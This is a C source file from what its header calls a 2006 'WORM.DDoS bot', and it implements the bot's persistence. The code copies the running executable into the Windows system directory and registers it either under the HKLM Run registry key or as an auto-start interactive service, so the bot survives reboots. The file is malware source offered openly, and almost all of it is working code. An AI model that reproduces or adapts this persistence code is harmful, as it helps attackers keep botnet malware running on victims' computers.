//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
#define BUFF 0xFF
//-----------------------------------------------------------------
BOOL HKEYRecord		(char str[BUFF]);
BOOL MAKEService	(char str[BUFF]);
//-----------------------------------------------------------------
BOOL AddIntoSystem(char recname[BUFF], int type){
	if(type){
		if(MAKEService(recname)){
			return TRUE;
		}else{
			return FALSE;
		}
	}else{
		if(HKEYRecord(recname)){
			return TRUE;
		}else{
			return FALSE;
		}
	}
}
//-----------------------------------------------------------------
BOOL HKEYRecord(char recname[BUFF]){ 

	char str[BUFF];
	char tmpbuf[BUFF];
	char sysbuf[BUFF];

	GetModuleFileName(GetModuleHandle(NULL), str, BUFF);
	GetSystemDirectory(sysbuf, BUFF);
	strcat(sysbuf, "\\");
	strcat(sysbuf, MY_MACRO_RECORD_NAME);
	strcat(sysbuf, ".exe\0");
	CopyFile(str, sysbuf, true);
	HKEY rechk;
	RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &rechk);
	RegSetValueEx(rechk, (LPCSTR)recname, 0, REG_SZ, (LPBYTE)sysbuf, (DWORD)strlen(sysbuf)+1);
	RegCloseKey(rechk);
	delete(str, tmpbuf, sysbuf);
return TRUE;
}
//-----------------------------------------------------------------
BOOL MAKEService(char recname[BUFF]){

	char		str[BUFF];
	char		servicedir[BUFF];
	SC_HANDLE	servman;
	SC_HANDLE	service;

	GetModuleFileName(GetModuleHandle(NULL), str, BUFF);
	GetSystemDirectory(servicedir, BUFF);
	strcat(servicedir, "\\");
	strcat(servicedir, recname);
	strcat(servicedir, ".exe\0");
	if(!FileExist(servicedir)){
		CopyFile(str, servicedir, true);
		servman = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		if(servman != NULL){
			service = CreateService(servman, MY_MACRO_SERVICE_NAME, MY_MACRO_SERVICE_NAME, 0, SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, servicedir, NULL, NULL, NULL, NULL, NULL);
			if(service != NULL){
				CloseServiceHandle(service);
				return TRUE;
			}
			CloseServiceHandle(service);
			return FALSE;
		}else{
			return FALSE;
		}
	}
	return FALSE;
}
//-----------------------------------------------------------------